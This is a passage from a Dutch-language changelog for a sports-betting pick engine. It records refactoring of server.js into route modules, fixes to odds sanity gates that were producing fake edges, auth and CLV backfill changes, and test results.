- NIET in scope (complexe deps, eigen sprint): POST/PUT /api/bets, POST /api/bets/recalculate, GET /api/bets/:id/current-odds. Docstring noteert dit.
- 2 nieuwe tests: missing-deps + route-mount wire-check.

### Changed

- server.js netto **-41 regels** (12211 → 12170).
- Totaal shrinkage sinds v11.0.0 (12537 baseline): **-367 regels** via 7 extracted route modules.

### Tests

593 passed · 0 failed.

## [11.2.5] - 2026-04-18

**Phase 5.4c · server.js extraction · admin-users routes**

### Added

- **[claude] `lib/routes/admin-users.js`** — GET/PUT/DELETE `/api/admin/users[/:id]`. 3 admin-only endpoints: list users, wijzig role/status (met approval-email + notify), verwijder user (self-delete beschermd). Deps: supabase, requireAdmin, loadUsers, saveUser, clearUsersCache, notify, sendEmail.
- 2 nieuwe tests: missing-deps + route-mount wire-check.

### Changed

- server.js netto **-34 regels** (12245 → 12211).
- Totaal shrinkage sinds v11.0.0 (12537 baseline): **-326 regels** via 6 extracted route modules (notifications, clv, auth, user, tracker, admin-users).

### Tests

591 passed · 0 failed.

## [11.2.4] - 2026-04-18

**Phase 5.4 · server.js extraction · User + Tracker routes**

### Added

- **[claude] `lib/routes/user.js`** — GET/PUT `/api/user/settings`. Allowlist blijft strikt (startBankroll, unitEur, language, timezone, scanTimes, scanEnabled, twoFactorEnabled, preferredBookies). Rescheduled admin-cron-scans bij PUT.
- **[claude] `lib/routes/tracker.js`** — GET `/api/check-results` + POST `/api/backfill-times` (admin). checkOpenBetResults + readBets helpers blijven in server.js tot Phase 5.5 refactor.
- 4 nieuwe tests: beide routers missing-deps throws + route-mount wire-checks.

### Changed

- server.js netto **-73 regels** (12318 → 12245).
- Totaal shrinkage sinds v11.0.0 (12537 baseline): **-292 regels** — monotone shrink houdt aan.

### Tests

589 passed · 0 failed · server.js syntax valid.

## [11.2.3] - 2026-04-18

**Phase 5.3 · server.js extraction · Auth routes** (5 endpoints, security-sensitive).

### Added

- **[claude] `lib/routes/auth.js`** — factory-pattern Express router. 5 endpoints:
  - `POST /api/auth/login` — email+password → JWT (of 2FA challenge)
  - `POST /api/auth/verify-code` — 2FA email-code → JWT
  - `POST /api/auth/register` — nieuwe user (status=pending admin-approve)
  - `GET /api/auth/me` — huidige user uit req.user.id
  - `PUT /api/auth/password` — change password (bcrypt)
- Deps expliciet inject (10 stuks): rateLimit, loadUsers, saveUser, bcrypt, jwt, jwtSecret, loginCodes (Map), sendEmail, notify, defaultSettings.
- Security-relevante patronen behouden: composite IP+email rate-limit key, constant-time 2FA compare (`crypto.timingSafeEqual`), email enumeration prevention op register, per-user bcrypt-hash rate-limit op password-change.
- 2 nieuwe tests: missing-deps throws, construct returnt router met 5 routes wire-check.

### Changed

- server.js netto **-116 regels** (12434 → 12318).
- Totaal server.js shrinkage sinds v11.0.0: **-272 regels**. Monotone shrink-directive blijft aangehouden.

### Why

Phase 5.3 — derde cluster onder modular-from-start doctrine. Auth is security-critical code; isolatie in eigen module maakt het makkelijker apart te reviewen + testen zonder de 12k monoliet in te hoeven lezen.

### Roadmap resterend

5.4: admin/v2 cluster (grootste) · 5.5: bets + tracker · 5.6: per-sport scan modules.

### Tests

585 passed · 0 failed · server.js syntax valid.

## [11.2.2] - 2026-04-18

**Phase 5.2 · server.js extraction · CLV routes** (3 endpoints, ~280 regels uit server.js).

### Added

- **[claude] `lib/routes/clv.js`** — factory-pattern Express router. 3 endpoints:
  - `POST /api/clv/backfill` — vul lege clv_pct voor settled/past-kickoff bets (met snapshot-fallback v11.0.1).
  - `POST /api/clv/recompute` — forced hercomputeer CLV voor bestaande settled bets (bv. na fetchCurrentOdds fix). Updates alleen bij delta ≥ minDelta. Draait tuning (kill-switch + autoTuneSignals + kellyStepup) na een batch updates.
  - `GET /api/clv/backfill/probe?bet_id=X` — dry-run diagnose voor één bet.
- Throws bij missing deps (fail-fast). 13 deps expliciet inject: supabase, requireAdmin, findGameIdVerbose, fetchCurrentOdds, fetchSnapshotClosing, marketKeyFromBetMarkt, matchesClvRecomputeTarget, afRateLimit, sportRateLimits, refreshKillSwitch, KILL_SWITCH, autoTuneSignalsByClv, evaluateKellyAutoStepup.
- 2 nieuwe tests: missing-deps throws, construct-returnt router met 3 routes wire-check.

### Changed

- server.js netto **−264 regels** (12685 → 12421).
- Totaal server.js shrinkage sinds v11.0.0: **−156 regels** (12537 baseline → 12421 nu), ondanks 11 nieuwe sanity gates in v11.2.1 + v11.1.x die regels toevoegden.

### Why

Tweede concrete cluster onder modular-from-start doctrine. Pattern identiek aan Phase 5.1 notifications: factory-pattern + expliciete deps + fail-fast + router mount. Demonstreert dat het patroon schaalbaar is voor ALLE toekomstige extracties (auth, bets, admin, tracker, scan).

### Roadmap resterend

Phase 5.3: auth + bets · 5.4: admin/v2 cluster · 5.5: tracker + check-results · 5.6: per-sport scan modules (grootste deel).

### Tests

583 passed · 0 failed · server.js syntax valid. Bestaande CLV backfill + snapshot fallback tests (v11.0.1) blijven werken via geïnjecteerde deps.

## [11.2.1] - 2026-04-18

**P0 volledige sanity-coverage · pre-operator-bets safety audit**

Op expliciet verzoek van operator ("ga inzetten, moet goed werken") is een
3-agent audit gedaan van ÉLKE mkP-callsite in elk van de 6 sporten. Audit
identificeerde 10 nog-kwetsbare pick-paden. Dit release dicht ze allemaal.

### Kritieke bug-fixes

1. **NFL Spread full-game** (server.js:4916-4946) — zelfde klasse als NBA 1H spread, NIET gefixt in v11.1.1. Nu: hasDevig + ≥3 bookies + sanity + fxMeta.
2. **Football Handicap** (server.js:6400-6452) — gebruikte fp.home/fp.away (full-game ML 3-way) DIRECT als cover-prob voor handicap. Zelfde structurele fout als 1H spread: -1.5 cover ≠ wins. Volledig herschreven met buildSpreadFairProbFns pattern.
3. **Handball Handicap** (server.js:5422-5451) — zelfde klasse. Nu paired devig + ≥3 bookies + sanity + fxMeta.
4. **Football Double Chance** 1X/12/X2 (server.js:6390-6410) — voorheen ZERO gates op 3 DC-varianten. Nu: sanity-check vs devigged 3-way consensus (fp.home+fp.draw etc.) + fxMeta per variant.
5. **Hockey Team Totals** (server.js:3719-3786) — Poisson λ zonder market-anchor per team. Nu: vereist paired over/under op zelfde line, Poisson-prob binnen 4pp van devigged consensus, anders skip.
6. **Baseball F5 ML pitcher-push cap** (server.js:4482) — f5PitcherAdj cap verlaagd van ±0.12 naar ±0.06. Pitcher × 3 kon voorheen 8pp buiten sanity-threshold drijven. Nu blijft binnen threshold.
7. **Baseball NRFI** (server.js:4409-4412) — vereist nu pitcherSig.valid + ≥3 paired bookies. Team-runs-per-game is te zwakke proxy voor pitcher-dominated market.

### Comprehensive sanity-gate coverage — alle O/U markten + Odd/Even

Nieuwe `passesDivergence2Way` + fxMeta + `≥2 paired bookies` toegevoegd aan:

- Football O/U 2.5 (tsAdj + weather + poisson + agg-push kunnen overP ~15% drijven)
- Basketball O/U full-game + 1H O/U
- Baseball O/U runs (mlbWeatherAdj)
- Baseball F5 O/U (pitcherUnderBias)
- NFL O/U full-game (weatherAdj) + 1H O/U
- Hockey O/U goals + 1st Period O/U
- Hockey Odd/Even (nu ≥3 paired bookies)
- Handball O/U

Voor pure-devig sites (model=market by construction) is de gate effectief een no-op, maar de `≥2 paired bookies` minimum beschermt tegen outlier-pool skew wanneer slechts 1 bookie de line aanbiedt.

### Combi-level sanity (via per-leg gates)

`lib/picks.js:mkP()` pushed naar combiPool EN picks. Mijn gate-checks wrappen de mkP call (`if (gate.pass) mkP(...)`). Een leg die sanity faalt komt daarom NIET in combiPool. Combi-prob (ep × ep × ep) is product van gevalideerde legs. Geen extra combi-gate nodig.

### `lib/odds-parser.js` kleine refinement

Baseball Run Line + NHL Puck Line vereisen nu ≥3 bookies paired per zijde (was ≥2 in v11.1.2). Consistent met de overall "≥3 voor variable-spread" standaard.

### Risk-matrix post-fix

| Sport × Markt | Voor v11.2.1 | Na v11.2.1 |
|---|---|---|
| Football ML 3-way | ✅ (v11.1.2) | ✅ |
| Football DNB | ✅ (v11.1.2) | ✅ |
| Football BTTS | ✅ (v11.1.2) | ✅ |
| Football DC (3 varianten) | ❌ geen gates | ✅ sanity + fxMeta |
| Football Handicap | ❌ verkeerd prob-model | ✅ paired devig + sanity |
| Football O/U 2.5 | ❌ signal-adj, geen gate | ✅ gate + fxMeta |
| Basketball ML | ✅ (v11.1.2) | ✅ |
| Basketball O/U (full + 1H) | ❌ geen gate | ✅ gate + fxMeta |
| Basketball Spread (full + 1H) | ✅ (v11.1.1) | ✅ |
| Hockey ML + 3-way | ✅ (bestaand) | ✅ |
| Hockey Team Totals | ❌ Poisson-only | ✅ paired + gate |
| Hockey Puck Line | ✅ (v11.1.2) | ✅ (≥3 bookies) |
| Hockey O/U + P1 + Odd/Even | ❌ geen gate | ✅ gate + fxMeta |
| Baseball ML | ✅ (v11.1.2) | ✅ |
| Baseball NRFI | ❌ zwakke proxy | ✅ pitcher-required + ≥3 |
| Baseball Run Line | ✅ (v11.1.2) | ✅ (≥3 bookies) |
| Baseball O/U + F5 O/U | ❌ signal-adj, geen gate | ✅ gate + fxMeta |
| Baseball F5 ML | ⚠️ 8pp unguarded | ✅ cap verlaagd |
| NFL ML | ✅ (v11.1.2) | ✅ |
| NFL Spread full-game | ❌ UNCHECKED | ✅ gate + ≥3 bookies |
| NFL 1H Spread | ✅ (v11.1.1) | ✅ |
| NFL O/U (full + 1H) | ❌ signal-adj, geen gate | ✅ gate + fxMeta |
| Handball ML + 3-way | ✅ (v11.1.2) | ✅ |
| Handball Handicap | ❌ UNCHECKED | ✅ gate + ≥3 bookies |
| Handball O/U | ❌ geen gate | ✅ gate + fxMeta |

### Tests

581 passed · 0 failed · syntax valid. Bestaande passesDivergence2Way tests (+6 in v11.1.2) dekken alle gebruikte scenarios.

### IMPACT voor operator

Operator-directive: "Dat wat erin zit moet goed werken" boven functionaliteit.
Met v11.2.1 zijn ALLE 6 sporten × alle hoofdmarkten afgedicht tegen:
- Signal-adj die model-prob > 4pp van markt drijft
- Eenzame bookie extreme spread/handicap lijnen zonder paired devig
- Poisson-only probs zonder market-anchor
- Dubbele signal-push uit combi-pad

Volgende scan: **verwacht minder picks dan voorheen**. Dat is correct. Elke pick die overleeft heeft nu 4 onafhankelijke quality-checks doorlopen. "Liever 0 picks dan 1 valse edge" doctrine.

## [11.2.0] - 2026-04-18

**Phase 5.1 · server.js route-extraction start** (first cluster: notifications + push).

### Added

- **[claude] `lib/routes/notifications.js`** — factory-pattern Express router extracted uit server.js. 6 routes: `/push/vapid-key`, `/push/subscribe` (POST/DELETE), `/inbox-notifications` (GET/PUT/DELETE). Deps expliciet inject: `{ supabase, isValidUuid, rateLimit, savePushSub, deletePushSub, vapidPublicKey }`. Defensive check throws bij missing deps.
- Mount in server.js: `app.use('/api', createNotificationsRouter({...}))` vervangt 6 inline handlers + 2 comment-blocks.
- 2 nieuwe tests: missing-deps throws, construct-returns-Express-router met 6 routes wire-check.

### Changed

- `server.js` netto -52 regels (67 verwijderd, 15 toegevoegd). Eerste concrete shrink van de monoliet onder de modular-from-start doctrine.
- De aggregate alert-feed `/api/notifications` blijft in server.js (veel cross-system deps: loadCalib, getAdminUserId, stats aggregatie); extractie na bredere helper-cleanup.

### Why

Doctrine-shift v11.0.0 "modular-from-start" vereist dat server.js vanaf nu monotonisch shrinkt. Notifications routes = kleinste zelfstandige cluster (6 endpoints, narrow deps, volledig getest) = ideaal als proof-of-concept voor het factory-pattern dat de rest van Phase 5 volgt.

Patroon voor volgende extracties:
1. `module.exports = function createXxxRouter(deps) { /* router.get/post(...) */ return router; }`
2. Throw bij missing required deps (fail-fast).
3. In server.js: `app.use('/api', createXxxRouter({...}))` vervangt inline handlers.
4. Tests verifiëren router-construction + route-mounting.

### Roadmap Phase 5 (volgende extracties)

- `lib/routes/clv.js` — `/api/clv/backfill`, `/api/clv/backfill/probe`, `/api/clv/recompute` (~400 regels)
- `lib/routes/auth.js` — login, register, 2FA, me (~300 regels)
- `lib/routes/bets.js` — bets CRUD + current-odds (~500 regels)
- `lib/routes/admin.js` — alle `/api/admin/v2/*` (~2000 regels)
- `lib/routes/tracker.js` — check-results, backfill-times (~400 regels)
- `lib/routes/scan.js` — /api/prematch SSE stream wrapper (~200 regels)
- `lib/runtime/results-checker.js` extended — full checkOpenBetResults body
- `lib/scan/` — per-sport scan modules

Target: server.js < 1500 regels.

### Tests

581 passed · 0 failed (+2 nieuwe notifications-router tests).

## [11.1.2] - 2026-04-18

**P0 comprehensive sanity-gate coverage · 11 markten** (vervolg-fix op operator-report "veel 2+ odds picks").

### Added

- **[claude] `lib/model-math.js:passesDivergence2Way(modelA, modelB, priceA, priceB, threshold)`** — pure helper die paired 2-way odds deviged + model-probability vergelijkt met market-implied. Returnt {passA, passB, marketFair}. Vig-range [1.00, 1.15) met fail-open bij onbruikbare vig. Default threshold 0.04 (4pp divergence).

### Fixed — sanity-gates per market

Elke nieuw gefixte site volgt hetzelfde patroon: als model-prob > 4pp van market-devigged consensus afligt, skip de pick. Voorheen passeerden signal-pushed of form-based probs onbeperkt, wat systematisch tot fake-edge picks leidde (zichtbaar in operator-report als "veel 2+ odds").

1. **Football BTTS Yes/Nee** (server.js:6217-6234) — operator's directe bug-report. Sandefjord/Rosenborg BTTS Nee @ 2.40 met 74% model-kans (42% market) wordt nu geblokkeerd.
2. **Football 1X2 ML 3-way** (server.js:6019-6026) — per-zijde sanity vs fp.home/fp.draw/fp.away consensus. Signal-adjusted adjHome2/adjAway2 die > 4pp divergeert wordt geskipt.
3. **Football DNB** (server.js:6303-6316) — devig2Way op bestDnbH/A prices.
4. **Basketball ML** (server.js:2991-3004) — devig2Way op adjHome/adjAway vs bH/bA odds.
5. **Baseball ML** (server.js:4309-4323) — devig2Way op adjHome/adjAway.
6. **Baseball NRFI/YRFI** (server.js:4420-4440) — devig2Way op adjNrfiP / (1-adjNrfiP).
7. **Baseball F5 ML** (server.js:4451-4486) — devig2Way op f5Home/f5Away (pitcher × 3 signal-weighted).
8. **Baseball Run Line** (server.js:4369-4414) — vereist nu ≥3 bookies per zijde paired devig + sanity. Fallback `fpHome × 0.55` skipt nu (was bron van fake edges bij dunne pools).
9. **NHL Puck Line** (server.js:3812-3852) — identiek patroon: ≥3 bookies + sanity + fix een bestaande typo (was `fpAway` ipv `fpAwayPuck` in display).
10. **NFL ML** (server.js:4836-4853) — devig2Way op adjHome/adjAway.
11. **Handball ML** (server.js:5337-5352) — devig2Way op adjHome/adjAway.

### Niet in scope (lage risk / structureel anders)

- Pure-devigged O/U markten (basketball, baseball, NFL, hockey, football, handball): model-prob IS market-consensus by construction, divergence-gate zou altijd agreement tonen. Geen fake-edge via divergence mogelijk.
- Hockey 1st Period O/U: devig-based, zelfde logica.
- Hockey Team Totals: Poisson-derived zonder direct market anchor per team. Kan in shadow-mode variant later.
- Football Double Chance / Asian Handicap: per-point devigged, patroon volgt Baseball Run Line fix indien gewenst.
- Handball Handicap: per-point devig, kan later.

### Operator-observatie "veel 2+ odds"

Bart's vraag was of 2+ odds een tactiek of bug was. Verklaring: de combinatie van (a) hoge odds + (b) overconfident model-prob bij signal-push → (c) grote fake edges → (d) top van ranking → Kelly size hoog → operator-zichtbaar patroon. Met de 11 sanity-gates actief valt dit symptoom structureel weg; picks die 2+ odds hebben en toch bovenaan staan zullen nu legit zijn (BTTS met genuine model-vs-market alignment, O/U line-shopping edges, etc.).

### Versie

v11.1.1 → v11.1.2 in 6 locaties + CHANGELOG.

### Tests

579 passed · 0 failed (+6 nieuwe passesDivergence2Way tests inclusief reproductie van BTTS bug 74% / NBA ML signal-push scenario).

## [11.1.1] - 2026-04-18

**P0 model-integrity fix · NBA/NFL 1H spread fake-edges** (operator-report item extra, image-v11).

### Fixed

- **[claude] 1H basketball + 1H NFL spread gebruikten full-game ML probability direct als fair-prob**. Bij extreme lijnen die alleen Bet365 aanbiedt (bv. -9.5, -10.5) gaf dit synthetische edges van 80-160% (operator zag Denver -9.5 @ 3.45 met 69% model-kans = Edge +85%, pure 158%). Nu: per-point devig via `buildSpreadFairProbFns`, 3-bookie-minimum gate, en `modelMarketSanityCheck` (4% divergence threshold).
- **[claude] Full-game NBA spread kreeg dezelfde hardening**: hasDevig-gate + bookie-count ≥ 3 + sanity-check + `_fixtureMeta` voor scan-gate playability.
- **[claude] `lib/odds-parser.js:buildSpreadFairProbFns`** exposeert nu ook `hasDevig(pt)` en `bookieCountAt(pt)` helpers. Callers kunnen nu expliciet checken of de fallback is gebruikt (= geen cross-bookie paired devig) en dat als grond om de pick te rejecten beschouwen.

### Why

Operator-report 2026-04-18 image-v11: twee NBA 1H picks met 158% pure edge, één BTTS Nee met redelijke 2.40 odds. Operator diagnose: "andere bookies bieden deze spread niet eens aan, daardoor is er geen markt-consensus". Diagnose klopt — `fpHome=69%` (full-game ML 2-way) werd direct doorgestuurd als 1H cover-prob, zonder devig, zonder bookie-check, zonder sanity-check. Een Bet365-only extreme lijn kreeg daardoor een fake edge bovenaan de ranking.

Operator stelde ook "veel 2+ odds picks" vast — dat was een symptoom van deze bug: hoge odds combineren met overconfident model-prob = hoge (fake) edge = top van ranking. Fix hierbij lost dat deels op. Bij eerlijke devig + sanity-check eindigen extreme-lijn picks op 5-15% edge (realistisch) of worden gerejected.

### Gates in volgorde

Voor elke 1H + full-game basketball/NFL spread-pick wordt nu gecheckt:
1. `hasDevig(point) === true` — cross-bookie paired devig beschikbaar? Zo nee, skip.
2. `bookieCountAt(point) >= 3` — minstens 3 bookies hebben deze line? Zo nee, skip.
3. `modelMarketSanityCheck(fp, 1/price).agree` — model-prob binnen 4% van markt-implied? Zo nee, skip.
4. `_fixtureMeta` meegegeven aan `mkP()` — scan-gate kan playability/thinness/stale-price meetsen.

Bij falen van 1 of 2: fallback-prob wordt genegeerd, pick fires niet. Bij falen van 3: logged maar niet als pick doorgevoerd.

### Tests

573 passed · 0 failed (+3 nieuwe hasDevig/bookieCountAt tests). De drie failure-modes (eenzame bookie, paired maar te divergent, valide met 3+ bookies) zijn gedekt.

### IMPACT

Bij volgende scan: geen 1H NBA/NFL spread picks meer uit Bet365-only extreme lijnen zonder market-consensus. Het BTTS/ML/Over/Under patroon blijft ongewijzigd. "Veel 2+ odds" pattern zou drastisch moeten afnemen voor 1H spreads specifiek.

Operator-waarneming dat de laatste scan Denver -9.5 en Cleveland -10.5 toonde met onrealistische edges = bevestigd als bug, niet als tactiek.

## [11.1.0] - 2026-04-18

**Phase 4 · early-payout shadow signal + referee-reds research-entry** (items 5b en 7 uit operator-report).

### Added

- **[claude] `docs/EARLY_PAYOUT_RULES.md`** — research-doc met per-bookie per-sport per-market early-payout regels. Bet365: 2-goal lead football, 5-run MLB, 20-point NBA, 3-goal NHL, 17-point NFL. Unibet/Pinnacle/Betfair: geen regels (pure full-time settlement). Handbal + NFL playoff gemarkeerd als "verify before activation".
- **[claude] `lib/signals/early-payout-rules.js`** — genormaliseerde EARLY_PAYOUT_RULES constant dict + getEarlyPayoutRule(bookie, sport, market) lookup helper. Alleen bevestigde regels geëncodeerd; verify-entries blijven weg tot operator signoff.
- **[claude] `lib/signals/early-payout.js`** — shadow-mode signaal-module:
  - `evaluateEarlyPayoutFromFinal(args)` — conservatieve ondergrens op basis van final-score differential (mist comeback-loss gevallen, aangegeven in module-docstring; shadow v2 gebruikt /events endpoint).
  - `logEarlyPayoutShadow(supabase, args)` — schrijft row naar `early_payout_log` tabel alleen wanneer rule applies (ruleApplies=true).
  - `aggregateEarlyPayoutStats(rows)` — pure helper voor analytics-endpoint.
- **[claude] SQL migration `docs/migrations-archive/v11.1.0_early_payout_log.sql`** — nieuwe `early_payout_log` tabel met bet_id, bookie, sport, market, selection, outcome, ep_rule_applied, ep_would_have_paid, potential_lift, scores, odds. RLS enabled + service-role policy.
- **[claude] Settle-flow wiring** — `checkOpenBetResults` roept `logEarlyPayoutShadow` na elke succesvolle `updateBetOutcome`. Fire-and-forget, try/catch omhuld, blokkeert settle-flow niet bij DB-fout.
- **[claude] GET `/api/admin/v2/early-payout-summary?days=30`** — admin endpoint. Per (bookie, sport, market) combinatie: samples, activationRate, conversionRate, readyForPromotion (bool, ≥50 samples). Shadow-mode readout; geen scoring-impact.
- **[claude] `docs/RESEARCH_MARKETS_SIGNALS.md`** — referee-reds → O/U 2.5 correlatie-vraag als open research-item gedocumenteerd. Geen code-change; wacht op 200+ settled O/U bets met referee-data vóór shadow-implementatie.

### Why

Operator-report item 5b: "Bet365 early payout voordelen ... is dit nog iets wat we willen? ... bv bij voetbal als team 2 doelpunten voorkomt sluit bet365 hem al af". Bart expliciet gevraagd dit grondig uit te zoeken, per bookie te differentiëren, en te testen of het vaak een W zou zijn geweest ondanks lagere Bet365 odds.

Volgt doctrine `project_signal_promotion_doctrine`: shadow-log eerst, promotion pas bij 50+ samples + bewezen lift. Geen scoring-impact v11.1.0.

### Doctrinaire caveats

- v1 activation-estimate is conservatief (final-diff-floor). Echte activation-rate ligt hoger; comeback-loss scenarios die bet365 WEL had uitbetaald worden gemist. Shadow v2 scope.
- odds-cost meting (Bet365 vs Unibet prijsspread) nog niet geautomatiseerd — volgt uit line-timeline data wanneer odds_snapshots matures.
- Alleen moneyline ML-picks worden gelogd (andere markt-types kennen geen EP).

### Tests

570 passed · 0 failed · 14 nieuwe tests:
- 6 rules-dict lookups (Bet365 per sport, Unibet/Pinnacle null, totals geen EP).
- 5 evaluateEarlyPayoutFromFinal scenarios (2-0 wouldPay, 1-0 not, Unibet skip, MLB 5-run, NBA 15pt).
- 2 logEarlyPayoutShadow (skip-on-false, write-on-true).
- 1 aggregator (3 Bet365 football rows, rates berekend).

### Operator-actie

Migration runnen: `node scripts/migrate.js docs/migrations-archive/v11.1.0_early_payout_log.sql` vóór eerste shadow-log rows kunnen worden geschreven.

## [11.0.2] - 2026-04-18

**Phase 3 · info-panel + near-miss surface** (items 2 en 6 uit operator-report).

### Added

- **[claude] C3.1 ChatGPT Plus subscription entry** in Info → 💳 Abonnementen kaart. Regel tussen Claude Max en Supabase: €23/mnd · Start 15-04-2026 · Verlengt 15-05-2026. Beschrijving: "Codex reviewer · second-opinion model · doctrine-sparring".
- **[claude] C3.2 Near-miss picks UI-sectie · `index.html`** (admin-only card op Analyse tab). Haalt data uit bestaand endpoint `/api/admin/v2/pick-candidates-summary?hours=24`. Toont `accepted/rejected` counts, top 6 rejection-redenen als inline tags, en laatste 10 rejected candidates met selection/bookie/odds/edge/reason.
  - `loadNearMisses()` fire't bij Analyse tab load + manual refresh-knop.
  - Silent-hide bij 404 (non-admin users).

### Why

Operator-report item 2: operator betaalt €23/mnd aan ChatGPT (OpenAI) voor de Codex review-workflow, was niet zichtbaar in de subscription-overview. Item 6: operator wilde kunnen zien welke picks "net niet" waren in recente scans zonder DB-tools te openen. Data bestond al in `pick_candidates.rejected_reason`; alleen UI-surface ontbrak.

### Tests

556 passed · 0 failed · geen nieuwe tests toegevoegd (UI-only changes, bestaand endpoint).

## [11.0.1] - 2026-04-18

**Phase 2 · operator-UX fixes** (items 4 en 5 uit operator-report).

### Fixed

- **[claude] C2.1 Odds-nu button UX · `index.html`** — `refreshCurrentOdds()` rendert nu zichtbare feedback op alle paden (`canRefresh:false`, ontbrekende fixture_id, markt-mapping fail, geen odds). Voorheen werd bij `canRefresh:false` een lege string gezet waardoor de knop "stil" leek terwijl hij gewoon werkte. Operator klacht: "Odds nu knop doet niks."

### Added

- **[claude] C2.2 CLV backfill snapshot-fallback · `lib/clv-backfill.js`** (new module).
  - `fetchSnapshotClosing(supabase, args)` query't `odds_snapshots` wanneer live `fetchCurrentOdds` faalt. Volgorde: preferred bookie → Pinnacle/Betfair (sharp anchor) → elke bookie (snapshot-any). Elk resultaat heeft `sourceType` voor transparency.
  - Wired in `/api/clv/backfill`: wanneer live-api geen odds vindt, probeer fallback vóór failed te registreren. Notificatie per backfill toont `via snapshot-preferred/sharp/any` tag.
- **[claude] C2.2 CLV backfill UI-button · `index.html`** — admin-only `🔄 CLV backfill` naast `⏰ Tijden invullen` in tracker toolbar. Triggert POST `/api/clv/backfill`, toont counts + snapshot-fallback-count inline.

### Why

Operator-report items 4 + 5: "Backfill lege CLVs, best wat die nog leeg zijn recentelijk" (backfill vereiste curl, geen UI) en "Odds nu knop doet niks" (silent-fail UX). Beide waren operator-pijn, geen correctness. Nu beide addressable vanuit de interface.

### Tests

556 passed · 0 failed. 7 nieuwe tests voor `fetchSnapshotClosing` (preferred > sharp > any preference, null edge-cases, odds sanity-check).

## [11.0.0] - 2026-04-18

**Major version bump** · architectuur-shift "modular-from-start" + drie P0 correctness-bugs uit operator-report weggenomen. Geen breaking API-changes voor externe consumers, wel een doctrine-shift in hoe nieuwe code wordt toegevoegd: alle nieuwe route-handlers, scan-helpers, signal-modules en runtime-helpers landen vanaf nu DIRECT in `lib/routes/`, `lib/scan/`, `lib/signals/`, `lib/runtime/` — nooit meer eerst in server.js. server.js shrinkt monotonisch vanaf deze release.

### P0 correctness-bugs uit operator-report 2026-04-18

- **[claude] C1.1 BTTS/ML/DNB auto-close gate · `lib/runtime/results-checker.js`** (new module).
  - **WHAT**: nieuwe `resolveBetOutcome(markt, ev, {isLive})` pure functie met volledige settle-pipeline (BTTS, O/U, NRFI/YRFI, 1H O/U + spread, P1 O/U, odd-even, DNB, spread/handicap, ML, 3-weg 60-min). LIVE-gate blokkeert auto-settle tenzij `resolveEarlyLiveOutcome` mathematisch-gegarandeerd resultaat oplevert (beide teams al gescoord voor BTTS Ja, over-lijn al bereikt, etc.). **Nooit auto-L uit live.**
  - **WHY**: operator report — twee Open BTTS bets werden door `/api/check-results` geauto-L'd terwijl één echt W was en de ander nog in progress. Root-cause: pipeline viel door naar finished-branch met partial score, waarna "else L" in BTTS-logic fireed. Learning-loop werd mee gecontamineerd via `updateCalibration`.
  - **BONUS**: `updateBetOutcome()` krijgt outcome-flip handling. `revertCalibration()` rolt vorige calibration-delta terug bij W→L of L→W corrections vóór de nieuwe wordt geapplied. Voorheen append-only → operator-correcties verdubbelden de vervuiling.
  - **IMPACT**: geen wrongly-closed Open bets meer. Signal-weights behouden integriteit bij corrections.
  - 13 nieuwe tests (live-gate + finished-pipeline coverage).

- **[claude] C1.2 Scan-heartbeat fix · `lib/runtime/scan-logger.js`** (new module).
  - **WHAT**: onvoorwaardelijke `scan_end` notificatie aan einde van elke scan (cron + manual, ook bij 0 picks). Heartbeat-watcher query nu `['cron_tick', 'scan_end', 'unit_change']` — drop legacy `scan_final_selection` dat nooit werd geschreven. `hasRecentScanActivity(rows)` pure helper voor testability.
  - **WHY**: operator report — SCANNER STIL alert 21 min NA een succesvolle cron-scan. Heartbeat zocht naar notification-type dat nergens werd geïnsert; cron_tick silent fail (Supabase timeout) of puur-manual scans → false alarm.
  - **IMPACT**: geen false-positive SCANNER STIL meer.
  - 6 nieuwe tests.

- **[claude] C1.3 Stake-regime drawdown op echte bankroll · `lib/stake-regime.js`** (computeBankrollMetrics helper).
  - **WHAT**: `computeBankrollMetrics(bets, startBankroll)` centraliseert regime-input-afleiding (rolling CLV/ROI windows, consecutive L, drawdown). Drawdown-anchor: balance/peak starten op `_activeStartBankroll` i.p.v. 0. Fallback bij startBankroll≤0: drawdownPct=0 (skip gate). Labels in regime-reasons tonen "bankroll piek €X → nu €Y" i.p.v. verwarrende "peak €X (nu €Y)" die P/L-getallen suggereerde.
  - **WHY**: operator report — web-push "STAKE-REGIME TRANSITION: exploratory → drawdown_hard · drawdown 56.4% sinds peak €88.72 (nu €38.72)". Die cijfers waren NET P/L, niet bankroll. Engine triggered `drawdown_hard` (kelly 0.25, unit ×0.5) terwijl echte bankroll ~8% was gezakt. Doctrine-hook §6 Fase 4: drawdown_hard is "catastrofaal verlies territory" — moet op echte bankroll, niet P/L-delta.
  - **IMPACT**: regime-engine acteert op correcte realiteit. Operator ziet concrete bankroll-cijfers die matchen met Settings. DRY: ~60 regels duplicate code weg uit server.js.
  - 7 nieuwe tests (real-anchor voorbeeld uit report, fallback, sort, rolling windows).

### Architectuur / doctrine

- **Modular-from-start directive**: nieuwe code landt voortaan direct in `lib/` (routes/scan/signals/runtime). server.js is voortaan alleen: app-setup, middleware-mount, boot-sequence. Volledige routes-extraction volgt in v11.2.x batch.
- **Dead-import cleanup**: `resolveEarlyLiveOutcome` uit `server.js` weggehaald (wordt nu via `results-checker.js` aangeroepen).
- **Silent-catch oplossing**: push-notif failure bij bet-result gebruikt nu `console.warn` met bet-id ipv `() => {}`.

### Tests

549 passed · 0 failed · 26 nieuwe tests gedekt over de 3 bugfixes. `npm audit --audit-level=high` clean.

### Versie-anker locaties (voor onderhouders)
`lib/app-meta.js`, `package.json`, `package-lock.json` (2x), `index.html` (2x), `README.md`, `docs/PRIVATE_OPERATING_MODEL.md`.

## [10.12.26] - 2026-04-17

Codex final-review response · eerlijke erkenning + dial-back overclaims + review bewaard in repo.

### Added
- **[claude] `docs/CODE_REVIEW_CODEX_FINAL_2026-04-17.md`** — het Codex-rapport (review-target v10.11.0) in de repo opgeslagen voor auditability.
- **[claude] `docs/CODE_REVIEW_CODEX_FINAL_RESPONSE.md`** — per-finding response in 3 categorieën:
  - (A) Strengths Codex terecht identificeerde · no-action
  - (B) Findings legitiem open op v10.11.0, inmiddels gefixt in v10.12.0–v10.12.25 · incl. mapping-tabel commit-per-commit
  - (C) Doctrinaire correcties die blijven gelden · geaccepteerd en gedial-backt

### Changed — language dial-back
- **v10.12.23 CHANGELOG entry** herschreven: "Full automation — geen operator knop" → "Stake-decision volledig geautomatiseerd — operator blijft buiten deze loop" + expliciete opsomming van operator-verantwoordelijkheden (bet-outcomes loggen, preferredBookies, scan-schedule, 2FA, manual scan trigger).
